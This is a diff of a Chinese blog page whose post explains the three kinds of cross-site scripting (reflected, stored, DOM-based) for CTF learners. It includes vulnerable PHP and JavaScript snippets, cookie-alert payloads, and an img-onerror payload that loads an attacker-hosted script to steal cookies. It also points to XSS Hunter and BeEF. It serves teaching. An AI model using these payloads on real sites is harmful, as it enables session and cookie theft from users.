@@ -97,17 +97,23 @@
 
 
 
-<meta name="description" content="Information Security">
+<meta name="description" content="这几天一直在做CTF上的XSS题目，走了很多弯路，但是也学到了很多东西，这篇博文主要讲一下什么是XSS，下一篇讲说一下几道题目的做法。 XSS 简介 跨站脚本攻击：英文是Cross Site Script，本应缩写为 CSS，但是为了和层叠样式表有所区别所以在安全领域称之为 XSS 。XSS 攻击，通常指黑客通过“HTML 注入”篡改网页内容，插入恶意脚本，从而在客户浏览网页的时候，控制用户浏览器">
 <meta name="keywords" content="Web Security">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Kiona">
-<meta property="og:url" content="https://kkkiona.github.io/archives/index.html">
+<meta property="og:type" content="article">
+<meta property="og:title" content="什么是 XSS">
+<meta property="og:url" content="https://kkkiona.github.io/2019/04/08/什么是XSS/index.html">
 <meta property="og:site_name" content="Kiona">
-<meta property="og:description" content="Information Security">
+<meta property="og:description" content="这几天一直在做CTF上的XSS题目，走了很多弯路，但是也学到了很多东西，这篇博文主要讲一下什么是XSS，下一篇讲说一下几道题目的做法。 XSS 简介 跨站脚本攻击：英文是Cross Site Script，本应缩写为 CSS，但是为了和层叠样式表有所区别所以在安全领域称之为 XSS 。XSS 攻击，通常指黑客通过“HTML 注入”篡改网页内容，插入恶意脚本，从而在客户浏览网页的时候，控制用户浏览器">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://kkkiona.github.io/2019/04/08/什么是XSS/Image0001.png">
+<meta property="og:image" content="https://kkkiona.github.io/2019/04/08/什么是XSS/Image0002.png">
+<meta property="og:image" content="https://kkkiona.github.io/2019/04/08/什么是XSS/Image0003.png">
+<meta property="og:image" content="https://kkkiona.github.io/2019/04/08/什么是XSS/Image0004.png">
+<meta property="og:updated_time" content="2019-04-15T06:07:45.346Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Kiona">
-<meta name="twitter:description" content="Information Security">
+<meta name="twitter:title" content="什么是 XSS">
+<meta name="twitter:description" content="这几天一直在做CTF上的XSS题目，走了很多弯路，但是也学到了很多东西，这篇博文主要讲一下什么是XSS，下一篇讲说一下几道题目的做法。 XSS 简介 跨站脚本攻击：英文是Cross Site Script，本应缩写为 CSS，但是为了和层叠样式表有所区别所以在安全领域称之为 XSS 。XSS 攻击，通常指黑客通过“HTML 注入”篡改网页内容，插入恶意脚本，从而在客户浏览网页的时候，控制用户浏览器">
+<meta name="twitter:image" content="https://kkkiona.github.io/2019/04/08/什么是XSS/Image0001.png">
 
 
   <script>
@@ -146,13 +152,13 @@
 
 
 
-  <link rel="canonical" href="https://kkkiona.github.io/archives/">
+  <link rel="canonical" href="https://kkkiona.github.io/2019/04/08/什么是XSS/">
 
 
 
 
 
-  <title>归档 | Kiona</title>
+  <title>什么是 XSS | Kiona</title>
   
 
 
@@ -171,7 +177,7 @@
     
   
 
-  <div class="container sidebar-position-left page-archive">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 	<a href="https://github.com/KKKiona" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewbox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -277,391 +283,257 @@
           <div id="content" class="content">		  	  
             
 
-  
-  
-  
-  <div class="post-block archive">
-    <div id="posts" class="posts-collapse">
-      <span class="archive-move-on"></span>
+  <div id="posts" class="posts-expand">
+    
 
-      <span class="archive-page-counter">
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://kkkiona.github.io/2019/04/08/什么是XSS/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Kiona">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/head.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Kiona">
+    </span>
+
+    
+      <header class="post-header">
+
         
         
+          <h1 class="post-title" itemprop="name headline">什么是 XSS</h1>
         
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-08T23:34:10+08:00">
+                2019-04-08
+              </time>
+            
+
+            
+
+            
+          </span>
+
           
-        
-        嗯..! 目前共计 22 篇日志。 继续努力。
-      </span>
 
-      
-
-        
-        
-        
-
-        
           
-          <div class="collection-title">
-            <h1 class="archive-year" id="archive-year-2019">2019</h1>
-          </div>
-        
-        
+            
+          
 
-        
+          
+          
+             <span id="/2019/04/08/什么是XSS/" class="leancloud_visitors" data-flag-title="什么是 XSS">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
 
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
 
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2019/04/29/使用vultr-hexo搭建博客添加图灵机器人/" itemprop="url">
+          
+            <div class="post-wordcount">
               
-                <span itemprop="name">使用vultr+hexo搭建博客添加图灵机器人</span>
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  1.2k
+                </span>
               
-            </a>
-        
-      </h2>
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-04-29T23:08:46+08:00" content="2019-04-29">
-          04-29
-        </time>
-      </div>
+              
+                <span class="post-meta-divider">|</span>
+              
 
-    </header>
-  </article>
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  4
+                </span>
+              
+            </div>
+          
 
+          
 
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
 
       
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2019/04/27/简单的解码/" itemprop="url">
-              
-                <span itemprop="name">简单的解码</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-04-27T11:26:24+08:00" content="2019-04-27">
-          04-27
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
       
 
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2019/04/24/简单的暴力破解/" itemprop="url">
-              
-                <span itemprop="name">简单的暴力破解</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-04-24T23:22:14+08:00" content="2019-04-24">
-          04-24
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
+      
+        <p>这几天一直在做CTF上的XSS题目，走了很多弯路，但是也学到了很多东西，这篇博文主要讲一下什么是XSS，下一篇讲说一下几道题目的做法。</p>
+<p><strong>XSS 简介</strong></p>
+<p>跨站脚本攻击：英文是Cross Site Script，本应缩写为 CSS，但是为了和层叠样式表有所区别所以在安全领域称之为 XSS 。<br>XSS 攻击，通常指黑客通过“HTML 注入”篡改网页内容，插入恶意脚本，从而在客户浏览网页的时候，控制用户浏览器的一种攻击。简单来说就是黑客通过探测可以植入数据的地方如URL，文本框等的漏洞，来注入恶意HTML代码从而获取像cookies等重要信息，甚至更严重的危害。这一点十分类似于SQL 注入，只不过这里注入的是HTML和JS。此外XSS最早的案例是跨域的，但时至今日跨域这一特点已不在重要，但是XSS这个名字却一直延续至今。<br>即便XSS长期位居Web安全的头号大敌，但是由于XSS破坏性强，且产生的原因复杂，很难以一次性解决，所以现今复杂的网络应用环境滋生着大量的XSS漏洞。</p>
+<p><strong>XSS 分类</strong></p>
+<p><strong>第一种：反射型 XSS</strong></p>
+<p>反射型XSS是最简单的类型，是指简单地把用户数据“反射”给浏览器。也就是说，黑客往往需要诱导用户点击一个恶意练级，才能攻击成功。反射型 XSS也叫做 “非持久性 XSS” （Non-persistent XSS）。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">if(isset($_GET[&apos;name&apos;]))&#123; </span><br><span class="line">        $text=$_GET[&apos;name&apos;];</span><br><span class="line">        echo &quot;&lt;div&gt;&quot;.$text.&quot;&lt;/div&gt;&quot; ; </span><br><span class="line">&#125; </span><br><span class="line">echo &apos;&lt;hr /&gt;&apos;; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>这段代码不加检查的把用户输入信息打印出来，如果我们输入以下代码。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.a.com/a.php?name=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/04/08/什么是XSS/Image0001.png" alt></p>
+<p>代码被执行了，用户cookies被打印出来。<br><a id="more"></a><br><strong>第二种：存储型 XSS</strong></p>
+<p>存储型 XSS 会把用户输入的数据“存储”在远端服务器。这种 XSS 具有很强的稳定性。<br>上边的例子中可以看出用户点击恶意链接之后弹出cookies对话框，但是远端的黑客并不知道。如果编写一段代码可以把获取的cookies发送到黑客的服务器或者邮箱上，就可以窃取用户cookies了。但是这种代码比较庞大不适合写成临时文件，如放在URL中会使得URL过长可能导致意想不到的错误，因此需要把代码事先写好，存在服务器上通过各种方式在客户端运行此代码。这种代码称为 XSS Payload。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=s=createElement(&apos;script&apos;);body.appendChild(s);s.src=&apos;http://www.a.com/xss&apos;;&gt;</span><br></pre></td></tr></table></figure>
+<p>这段代码会生成一个实际并不存在的图片，图片地址里面包含了恶意代码的地址，这样代码便被浏览器执行了，客户信息将被事先编写的js获取并告知黑客。<br>现如今互联网上遍布着各种公开的XSS Payload 模块，XSS 测试平台也很多，不想自己搭建的话可以直接使用，各平台大部分都是从GitHub上clone的大同小异，可以在项目管理界面实时查看成果。<br><img src="/2019/04/08/什么是XSS/Image0002.png" alt><br>推荐一下国外的XSS Hunter ，这个平台可以把结果发送到你的邮箱，并且支持的注入方式很多，攻击模块也比较齐全，坏处就是国内访问延迟有点大，全英文会坑新人。有兴趣的话还是自己用kali搭个BeEF吧，谁用谁知道。</p>
+<p><strong>第三种：DOM Based XSS</strong></p>
+<p>实际上，这种类型的XSS并非按照“数据是否存储在服务器”来划分，DOM Based XSS 从效果上来说也是反射型XSS。只是因为其成因比较特殊，使用过修改页面的DOM节点来形成的XSS，称之为 DOM Based XSS。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">function fun()&#123;</span><br><span class="line">	var str=document.getElementById(&quot;text&quot;).value;</span><br><span class="line">	var d=document.getElementById(&quot;t&quot;).innerHTML=&quot;&lt;a herf=&apos; &quot;+str+&quot; &apos;&gt;link&lt;/a&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;div id=&quot;t&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; id=&quot;text&quot; value=&quot;&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;button&quot; id=&quot;s&quot; value=&quot;write&quot;  onclick=&quot;fun()&quot; /&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/04/08/什么是XSS/Image0003.png" alt><br>页面根据用户的输入生成一个链接，由于没有进行合法性检查，所以可以输入以下代码。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; onclick=alert(document.cookie) //</span><br></pre></td></tr></table></figure>
+<p>点击链接用户信息被输出。<br><img src="/2019/04/08/什么是XSS/Image0004.png" alt><br>这里用到了闭合的技巧会在下一篇博文中讲到。</p>
+<p>这是关于XSS的简单介绍，下篇中会结合题目说一些XSS攻击方式。</p>
 
       
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2019/04/23/终端命令/" itemprop="url">
-              
-                <span itemprop="name">终端命令</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-04-23T17:22:32+08:00" content="2019-04-23">
-          04-23
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2019/04/22/压缩文件明文攻击/" itemprop="url">
-              
-                <span itemprop="name">压缩文件明文攻击</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-04-22T16:26:16+08:00" content="2019-04-22">
-          04-22
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2019/04/21/数据包文件包含/" itemprop="url">
-              
-                <span itemprop="name">数据包文件包含</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-04-21T09:54:27+08:00" content="2019-04-21">
-          04-21
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2019/04/20/流量分析题/" itemprop="url">
-              
-                <span itemprop="name">流量分析题</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-04-20T15:42:36+08:00" content="2019-04-20">
-          04-20
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2019/04/18/docx文件/" itemprop="url">
-              
-                <span itemprop="name">docx文件</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-04-18T14:48:37+08:00" content="2019-04-18">
-          04-18
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2019/04/18/Exif隐写题/" itemprop="url">
-              
-                <span itemprop="name">Exif隐写题</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-04-18T14:30:06+08:00" content="2019-04-18">
-          04-18
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2019/04/17/LSB-图片隐写/" itemprop="url">
-              
-                <span itemprop="name">LSB-图片隐写</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-04-17T19:22:18+08:00" content="2019-04-17">
-          04-17
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
     </div>
+    
+    
+    
+	
+	<div>
+	
+		<div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+	
+	</div>
+	
+	<div>
+      
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
+  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+  <p><span>本文标题:</span><a href="/2019/04/08/什么是XSS/">什么是 XSS</a></p>
+  <p><span>文章作者:</span><a href="/" title="访问 Kiona 的个人博客">Kiona</a></p>
+  <p><span>发布时间:</span>2019年04月08日 - 23:04</p>
+  <p><span>最后更新:</span>2019年04月15日 - 14:04</p>
+  <p><span>原始链接:</span><a href="/2019/04/08/什么是XSS/" title="什么是 XSS">https://kkkiona.github.io/2019/04/08/什么是XSS/</a>
+    <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://kkkiona.github.io/2019/04/08/什么是XSS/" aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
+</div>
+<script> 
+    var clipboard = new Clipboard('.fa-clipboard');
+    $(".fa-clipboard").click(function(){
+      clipboard.on('success', function(){
+        swal({   
+          title: "",   
+          text: '复制成功',
+          icon: "success", 
+          showConfirmButton: true
+          });
+    });
+    });  
+</script>
+
+      
+	</div>
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/04/08/SVG-图片验证码解码/" rel="next" title="SVG 图片验证码解码">
+                <i class="fa fa-chevron-left"></i> SVG 图片验证码解码
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/04/09/VPS服务器搭建SSR_SS/" rel="prev" title="VPS服务器搭建SSR/SS">
+                VPS服务器搭建SSR/SS <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
   </div>
   
   
   
-
-  
-  <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/archives/page/2/">2</a><a class="page-number" href="/archives/page/3/">3</a><a class="extend next" rel="next" href="/archives/page/2/"><i class="fa fa-angle-right"></i></a>
-  </nav>
+  </article>
 
 
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -669,6 +541,10 @@
 
 
           
+
+  
+
+
 
         </div>
         
@@ -990,6 +866,10 @@ var talkAPI = "http://openapi.tuling123.com/openapi/api/v2";//如果有类似图
   
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
 
   
 
@@ -1528,13 +1408,13 @@ var talkAPI = "http://openapi.tuling123.com/openapi/api/v2";//如果有类似图
       var articles = db.collection('articles')
 
       //https://hexo.io/zh-tw/docs/variables.html
-      var isPost = ''.length > 0
+      var isPost = '什么是 XSS'.length > 0
       var isArchive = '' === 'true'
       var isCategory = ''.length > 0
       var isTag = ''.length > 0
 
       if (isPost) { //is article page
-        var title = ''
+        var title = '什么是 XSS'
         var doc = articles.doc(title)
 
         getCount(doc, true).then(appendCountTo($('.post-meta')))
@@ -1542,7 +1422,7 @@ var talkAPI = "http://openapi.tuling123.com/openapi/api/v2";//如果有类似图
       else if (!isArchive && !isCategory && !isTag) { //is index page
         var titles = [] //array to titles
 
-        var postsstr = 'titles.push("使用vultr+hexo搭建博客添加图灵机器人");titles.push("简单的解码");titles.push("简单的暴力破解");titles.push("终端命令");titles.push("压缩文件明文攻击");titles.push("数据包文件包含");titles.push("流量分析题");titles.push("docx文件");titles.push("Exif隐写题");titles.push("LSB-图片隐写");' //if you have a better way to get titles of posts, please change it
+        var postsstr = '' //if you have a better way to get titles of posts, please change it
         eval(postsstr)
 
         var promises = titles.map(function (title) {
